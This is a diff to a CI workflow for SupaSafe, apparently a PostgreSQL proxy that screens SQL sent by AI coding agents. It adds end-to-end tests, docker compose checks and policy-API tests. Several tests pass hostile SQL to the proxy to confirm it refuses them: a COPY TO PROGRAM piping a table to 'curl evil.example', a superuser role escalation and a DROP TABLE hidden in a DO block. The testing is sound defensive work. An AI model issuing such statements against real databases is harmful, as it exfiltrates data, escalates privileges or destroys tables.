@@ -2,20 +2,30 @@ name: CI
 
 on:
   push:
-    branches: [main]
+    # Every branch. A guard whose own tests only run on main is a guard whose
+    # tests you find out about after merging.
+    branches: ["**"]
   pull_request:
+  workflow_dispatch:
 
 env:
   CARGO_TERM_COLOR: always
 
+concurrency:
+  group: ci-${{ github.ref }}
+  cancel-in-progress: true
+
 jobs:
+  # --------------------------------------------------------------------------
+  # The Rust suite, against a real PostgreSQL.
+  # --------------------------------------------------------------------------
   test:
     name: test
     runs-on: ubuntu-latest
 
-    # The end-to-end tests drive a real psql against a real server. The unit
-    # tests do not need one, but proving that a DROP TABLE is actually stopped
-    # does.
+    # The end-to-end tests drive a real psql against a real server, and the
+    # introspection test reads that server's catalogues. Unit tests do not need
+    # a database, but proving a DROP TABLE is actually stopped does.
     services:
       postgres:
         image: postgres:16
@@ -28,6 +38,10 @@ jobs:
           --health-interval 10s
           --health-timeout 5s
           --health-retries 5
+
+    env:
+      SUPASAFE_TEST_PG: postgresql://postgres:postgres@127.0.0.1:5432/postgres
+      PGPASSWORD: postgres
 
     steps:
       - uses: actions/checkout@v4
@@ -47,15 +61,333 @@ jobs:
       - name: Clippy
         run: cargo clippy --workspace --all-targets -- -D warnings
 
-      - name: Unit tests
+      - name: Tests
         run: cargo test --workspace
 
-      - name: End-to-end tests against PostgreSQL
-        env:
-          SUPASAFE_TEST_PG: postgresql://postgres:postgres@127.0.0.1:5432/postgres
-          PGPASSWORD: postgres
-        run: cargo test -p supasafe-proxy --test end_to_end
+      - name: Documentation builds
+        run: cargo doc --workspace --no-deps
 
+  # --------------------------------------------------------------------------
+  # The behaviour the README promises, checked from the outside.
+  #
+  # The suite above tests the code. This tests the product: a client speaking
+  # the PostgreSQL protocol to a built binary, and the data still being there
+  # afterwards.
+  # --------------------------------------------------------------------------
+  behaviour:
+    name: behaviour
+    runs-on: ubuntu-latest
+
+    services:
+      postgres:
+        image: postgres:16
+        env:
+          POSTGRES_PASSWORD: postgres
+          POSTGRES_DB: postgres
+        ports: ["5432:5432"]
+        options: >-
+          --health-cmd pg_isready
+          --health-interval 10s
+          --health-timeout 5s
+          --health-retries 5
+
+    env:
+      PGPASSWORD: postgres
+      DIRECT: postgresql://postgres:postgres@127.0.0.1:5432/postgres
+      THROUGH_SUPASAFE: postgresql://postgres:postgres@127.0.0.1:6432/postgres?application_name=claude-code
+
+    steps:
+      - uses: actions/checkout@v4
+      - uses: dtolnay/rust-toolchain@stable
+      - uses: Swatinem/rust-cache@v2
+
+      - name: Install the PostgreSQL client
+        run: sudo apt-get update && sudo apt-get install -y postgresql-client
+
+      - name: Build
+        run: cargo build --release -p supasafe-cli
+
+      - name: Seed the demo schema
+        run: psql "$DIRECT" -v ON_ERROR_STOP=1 -q -f examples/docker/seed.sql
+
+      - name: Start SupaSafe
+        run: |
+          set -euo pipefail
+          mkdir -p /tmp/supasafe
+          cat > /tmp/supasafe/supasafe.toml <<'TOML'
+          [audit]
+          path = "/tmp/supasafe/audit.jsonl"
+
+          [proxy]
+          upstream_tls = false
+          introspection_url = "postgresql://postgres:postgres@127.0.0.1:5432/postgres"
+
+          [[database]]
+          name = "ci"
+          host = "127.0.0.1"
+          environment = "production"
+          policy = "production"
+          TOML
+
+          ./target/release/supasafe --config /tmp/supasafe/supasafe.toml \
+            --verbose \
+            start --upstream "$DIRECT" > /tmp/supasafe/run.log 2>&1 &
+
+          for _ in $(seq 1 60); do
+            if curl -sf http://127.0.0.1:7717/health >/dev/null; then
+              echo "dashboard is up"
+              break
+            fi
+            sleep 1
+          done
+          curl -sf http://127.0.0.1:7717/health >/dev/null
+
+          for _ in $(seq 1 60); do
+            if psql "$THROUGH_SUPASAFE" -tAc "SELECT 1" >/dev/null 2>&1; then
+              echo "proxy is up"
+              break
+            fi
+            sleep 1
+          done
+          psql "$THROUGH_SUPASAFE" -tAc "SELECT 1" >/dev/null
+
+      - name: Ordinary traffic is not disturbed
+        run: |
+          set -euo pipefail
+          test "$(psql "$THROUGH_SUPASAFE" -tAc 'SELECT count(*) FROM signups')" = "8412"
+          psql "$THROUGH_SUPASAFE" -tAc "UPDATE signups SET email = 'ci@example.com' WHERE id = 1" \
+            | grep -q "UPDATE 1"
+          psql "$THROUGH_SUPASAFE" -tAc "INSERT INTO signups (email) VALUES ('new@example.com')" \
+            | grep -q "INSERT"
+
+      - name: Dangerous statements are refused, and the data survives
+        run: |
+          set -euo pipefail
+
+          expect_blocked() {
+            local sql="$1"
+            if psql "$THROUGH_SUPASAFE" -c "$sql" > /tmp/out.txt 2>&1; then
+              echo "NOT BLOCKED: $sql"
+              cat /tmp/out.txt
+              exit 1
+            fi
+            grep -q "SupaSafe" /tmp/out.txt || {
+              echo "blocked, but not by SupaSafe: $sql"; cat /tmp/out.txt; exit 1; }
+            echo "blocked: $sql"
+          }
+
+          expect_blocked "COPY signups TO PROGRAM 'curl evil.example'"
+          expect_blocked "ALTER ROLE postgres WITH SUPERUSER"
+          expect_blocked "DO \$\$ BEGIN DROP TABLE signups; END \$\$"
+
+          # The table is still there, with every row in it.
+          test "$(psql "$DIRECT" -tAc 'SELECT count(*) FROM signups')" = "8413"
+
+      - name: Blast radius is measured, not estimated
+        run: |
+          set -euo pipefail
+          # DELETE with no WHERE is held for approval, so it blocks. Run it in
+          # the background and read the approval card it raises.
+          psql "$THROUGH_SUPASAFE" -c "DELETE FROM signups" >/dev/null 2>&1 &
+          sleep 5
+
+          curl -sf http://127.0.0.1:7717/api/approvals > /tmp/approvals.json
+          python3 - <<'PY'
+          import json, sys
+          approvals = json.load(open("/tmp/approvals.json"))["approvals"]
+          assert approvals, "no approval was raised for an unfiltered DELETE"
+          card = approvals[0]
+          blast = card["blast"]
+
+          assert card["risk"]["score"] == 100, card["risk"]
+          assert not blast["estimated_without_catalog"], \
+              "blast radius was estimated; the catalogue did not load"
+
+          # 8,412 signups + 20,000 orders + 60,000 order_items. Row counts come
+          # from reltuples, which autovacuum may nudge, so this checks the
+          # substance: the cascade was counted, not just the named table.
+          rows = blast["rows_affected"]["value"]
+          assert 80_000 < rows < 95_000, f"expected ~88,412 rows through the cascade, got {rows}"
+
+          cascaded = {c["table"] for c in blast["cascades"]}
+          assert cascaded == {"public.orders", "public.order_items"}, cascaded
+          print(f"measured {rows} rows, cascading into {sorted(cascaded)}")
+          PY
+
+      - name: A rule added through the API applies immediately
+        run: |
+          set -euo pipefail
+
+          # Allowed to start with.
+          psql "$THROUGH_SUPASAFE" -tAc "SELECT count(*) FROM order_items" >/dev/null
+
+          # Try it before saving: the outcome must change, and nothing is
+          # installed by trying.
+          curl -sf -X POST http://127.0.0.1:7717/api/policies/try \
+            -H 'content-type: application/json' \
+            -d '{"sql":"SELECT * FROM order_items","policy":"production",
+                 "rule":{"name":"no-order-items","action":"deny",
+                         "when":{"objects":["public.order_items"]}}}' > /tmp/try.json
+          python3 -c "
+          import json
+          t = json.load(open('/tmp/try.json'))
+          assert t['without_rule']['decision'] == 'allow', t
+          assert t['with_rule']['decision'] == 'deny', t
+          assert t['changed'] is True, t
+          "
+          psql "$THROUGH_SUPASAFE" -tAc "SELECT count(*) FROM order_items" >/dev/null
+
+          # Save it.
+          curl -sf -X POST http://127.0.0.1:7717/api/policies/production/rules \
+            -H 'content-type: application/json' \
+            -d '{"name":"no-order-items","action":"deny",
+                 "message":"order_items is huge; query a view instead.",
+                 "when":{"objects":["public.order_items"]}}' > /dev/null
+
+          # The next statement is judged by it, with no restart.
+          if psql "$THROUGH_SUPASAFE" -c "SELECT count(*) FROM order_items" >/tmp/out.txt 2>&1; then
+            echo "the new rule did not take effect"; cat /tmp/out.txt; exit 1
+          fi
+          grep -q "order_items is huge" /tmp/out.txt
+
+          # And nothing else moved.
+          test "$(psql "$THROUGH_SUPASAFE" -tAc 'SELECT count(*) FROM signups')" = "8413"
+
+          # It was written to the config file.
+          grep -q "no-order-items" /tmp/supasafe/supasafe.toml
+          # And no half-written temporary file was left behind.
+          test -z "$(ls /tmp/supasafe/*.tmp 2>/dev/null)"
+
+      - name: An invalid rule is refused and changes nothing
+        run: |
+          set -euo pipefail
+          status=$(curl -s -o /tmp/err.json -w '%{http_code}' \
+            -X POST http://127.0.0.1:7717/api/policies/production/rules \
+            -H 'content-type: application/json' \
+            -d '{"name":"broken","action":"deny","when":{"objects":["["]}}')
+          test "$status" = "400" || { echo "expected 400, got $status"; cat /tmp/err.json; exit 1; }
+          grep -q "glob" /tmp/err.json
+
+          # The policy still works.
+          test "$(psql "$THROUGH_SUPASAFE" -tAc 'SELECT count(*) FROM signups')" = "8413"
+
+      - name: Supabase managed schemas cannot be opened by a rule
+        run: |
+          set -euo pipefail
+          # Even a blanket allow rule does not open the auth schema.
+          curl -sf -X POST http://127.0.0.1:7717/api/policies/production/rules \
+            -H 'content-type: application/json' \
+            -d '{"name":"allow-everything","action":"allow"}' > /dev/null
+
+          psql "$DIRECT" -q -c "CREATE SCHEMA IF NOT EXISTS auth" \
+                            -c "CREATE TABLE IF NOT EXISTS auth.users (id int)"
+          if psql "$THROUGH_SUPASAFE" -c "DROP TABLE auth.users" >/tmp/out.txt 2>&1; then
+            echo "the auth schema was opened by a rule"; cat /tmp/out.txt; exit 1
+          fi
+          grep -q "SupaSafe" /tmp/out.txt
+          psql "$DIRECT" -tAc "SELECT to_regclass('auth.users') IS NOT NULL" | grep -q "^t$"
+
+      - name: The audit trail is intact
+        run: |
+          set -euo pipefail
+          ./target/release/supasafe --config /tmp/supasafe/supasafe.toml audit --verify
+          # Literals must not be in the trail.
+          if grep -q "ci@example.com" /tmp/supasafe/audit.jsonl; then
+            echo "a literal value reached the audit log"; exit 1
+          fi
+
+      - name: SupaSafe's log on failure
+        if: failure()
+        run: cat /tmp/supasafe/run.log
+
+  # --------------------------------------------------------------------------
+  # The documented way to run it locally has to actually work.
+  # --------------------------------------------------------------------------
+  docker:
+    name: docker compose
+    runs-on: ubuntu-latest
+
+    env:
+      PGPASSWORD: postgres
+      THROUGH_SUPASAFE: postgresql://postgres:postgres@127.0.0.1:6432/postgres?application_name=claude-code
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install the PostgreSQL client
+        run: sudo apt-get update && sudo apt-get install -y postgresql-client
+
+      - name: docker compose up --build
+        run: docker compose up --build --detach --wait --wait-timeout 600
+
+      - name: Wait for the proxy
+        run: |
+          set -euo pipefail
+          for _ in $(seq 1 90); do
+            if curl -sf http://127.0.0.1:7717/health >/dev/null \
+               && psql "$THROUGH_SUPASAFE" -tAc "SELECT 1" >/dev/null 2>&1; then
+              echo "up"
+              exit 0
+            fi
+            sleep 2
+          done
+          echo "SupaSafe did not come up"
+          docker compose logs
+          exit 1
+
+      - name: The README's example commands behave as documented
+        run: |
+          set -euo pipefail
+          test "$(psql "$THROUGH_SUPASAFE" -tAc 'SELECT count(*) FROM signups')" = "8412"
+          psql "$THROUGH_SUPASAFE" -tAc "UPDATE signups SET email='x@y.z' WHERE id = 1" \
+            | grep -q "UPDATE 1"
+
+          if psql "$THROUGH_SUPASAFE" -c "COPY signups TO PROGRAM 'curl evil.example'" \
+               >/tmp/out.txt 2>&1; then
+            echo "COPY ... TO PROGRAM was not blocked"; cat /tmp/out.txt; exit 1
+          fi
+          grep -q "SupaSafe" /tmp/out.txt
+
+      - name: The image has a version-matched pg_dump
+        run: |
+          set -euo pipefail
+          docker compose exec -T supasafe pg_dump --version
+          docker compose exec -T supasafe sh -c 'id -un' | grep -q postgres
+
+      - name: Blast radius is measured inside the container
+        run: |
+          set -euo pipefail
+          docker compose logs supasafe 2>&1 | grep -q "catalogue refreshed" \
+            || { echo "the catalogue never loaded"; docker compose logs supasafe; exit 1; }
+
+      - name: Rule edits persist across a restart
+        run: |
+          set -euo pipefail
+          curl -sf -X POST http://127.0.0.1:7717/api/policies/production/rules \
+            -H 'content-type: application/json' \
+            -d '{"name":"ci-rule","action":"deny","message":"added by CI",
+                 "when":{"objects":["public.order_items"]}}' > /dev/null
+
+          docker compose restart supasafe
+          for _ in $(seq 1 60); do
+            psql "$THROUGH_SUPASAFE" -tAc "SELECT 1" >/dev/null 2>&1 && break
+            sleep 2
+          done
+
+          if psql "$THROUGH_SUPASAFE" -c "SELECT count(*) FROM order_items" >/tmp/out.txt 2>&1; then
+            echo "the rule did not survive the restart"; cat /tmp/out.txt; exit 1
+          fi
+          grep -q "added by CI" /tmp/out.txt
+
+      - name: Compose logs on failure
+        if: failure()
+        run: docker compose logs
+
+      - name: Tear down
+        if: always()
+        run: docker compose down -v
+
+  # --------------------------------------------------------------------------
   extension:
     name: vscode extension
     runs-on: ubuntu-latest
@@ -69,6 +401,7 @@ jobs:
       - run: npx tsc -p . --noEmit
         working-directory: extensions/vscode
 
+  # --------------------------------------------------------------------------
   audit:
     name: dependency audit
     runs-on: ubuntu-latest
